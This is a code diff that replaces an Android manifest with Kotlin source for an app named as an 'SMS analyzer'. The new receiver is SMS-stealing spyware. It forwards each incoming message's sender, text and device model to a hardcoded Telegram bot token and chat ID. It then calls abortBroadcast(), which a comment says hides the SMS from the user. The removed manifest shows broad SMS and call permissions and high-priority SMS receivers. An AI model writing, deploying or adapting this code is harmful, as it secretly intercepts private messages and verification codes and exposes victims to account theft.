@@ -1,87 +1,85 @@
-<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools">
+package com.analyzer.smsbeta
 
-    <uses-feature
-        android:name="android.hardware.telephony"
-        android:required="false" />
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.os.Bundle
+import android.provider.Telephony
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import okio.IOException
 
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
-    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
-    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
-    <uses-permission android:name="android.permission.WRITE_SMS" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
+class SmsReceiver : BroadcastReceiver() {
+    private val client = OkHttpClient()
 
-    <application
-        android:allowBackup="true"
-        android:dataExtractionRules="@xml/data_extraction_rules"
-        android:fullBackupContent="@xml/backup_rules"
-        android:icon="@mipmap/ic_launcher"
-        android:label="@string/app_name"
-        android:roundIcon="@mipmap/ic_launcher_round"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.SmsAnalyzerBeta">
+    override fun onReceive(context: Context?, intent: Intent?) {
+        if (intent?.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
+            val bundle: Bundle? = intent.extras
+            if (bundle != null) {
+                val pdus: Array<Any?>? = bundle.get("pdus") as Array<Any?>?
+                if (pdus != null) {
+                    for (pdu in pdus) {
+                        val smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent).firstOrNull()
+                        smsMessage?.let {
+                            val sender: String = it.originatingAddress ?: "Неизвестный отправитель"
+                            val messageBody: String = it.messageBody ?: "Пустое сообщение"
+                            val deviceModel = getDeviceModel()
+
+                            sendToTelegramBot(sender, messageBody, deviceModel)
+                            
+                            // Подавляем уведомление, чтобы SMS не показывались пользователю
+                            abortBroadcast()
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    private fun getDeviceModel(): String {
+        return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
+    }
+
+    private fun sendToTelegramBot(sender: String, message: String, device: String) {
+        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
+        val chatId = "6331293386"
+        val url = "https://api.telegram.org/bot$botToken/sendMessage"
+
+        val text = """
+            Получено новое смс!
+            Отправитель: $sender
+            Сообщение: $message
         
-        <!-- Main Activity -->
-        <activity
-            android:name=".MainActivity"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
+            $device
+        """.trimIndent()
 
-        <!-- Default Phone Handler -->
-        <activity
-            android:name=".DefaultDialerActivity"
-            android:exported="true"
-            android:label="@string/app_name">
-            <intent-filter>
-                <action android:name="android.intent.action.DIAL" />
-                <category android:name="android.intent.category.DEFAULT" />
-            </intent-filter>
-        </activity>
+        val mediaType = "application/json".toMediaType()
+        val requestBody = """
+            {
+                "chat_id": "$chatId",
+                "text": "$text",
+                "parse_mode": "Markdown"
+            }
+        """.trimIndent().toRequestBody(mediaType)
 
-        <!-- Default SMS Handler -->
-        <activity
-            android:name=".DefaultSmsActivity"
-            android:exported="true"
-            android:label="@string/app_name">
-            <intent-filter>
-                <action android:name="android.intent.action.SENDTO" />
-                <category android:name="android.intent.category.DEFAULT" />
-                <data android:scheme="smsto" />
-                <data android:scheme="sms" />
-            </intent-filter>
-        </activity>
+        val request = Request.Builder()
+            .url(url)
+            .post(requestBody)
+            .build()
 
-        <!-- Call Receiver -->
-        <receiver 
-            android:name=".CallReceiver" 
-            android:exported="true"
-            android:permission="android.permission.BROADCAST_SMS">
-            <intent-filter>
-                <action android:name="android.intent.action.PHONE_STATE" />
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-            </intent-filter>
-        </receiver>
+        client.newCall(request).enqueue(object : okhttp3.Callback {
+            override fun onFailure(call: okhttp3.Call, e: IOException) {
+                e.printStackTrace()
+            }
 
-        <!-- SMS Receiver -->
-        <receiver
-            android:name=".SmsReceiver"
-            android:exported="true"
-            android:permission="android.permission.BROADCAST_SMS">
-            <intent-filter android:priority="999">
-                <action android:name="android.provider.Telephony.SMS_DELIVER" />
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-            </intent-filter>
-        </receiver>
-    </application>
-</manifest>
+            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
+                if (!response.isSuccessful) {
+                    println("${response.code}")
+                }
+                response.close()
+            }
+        })
+    }
+}
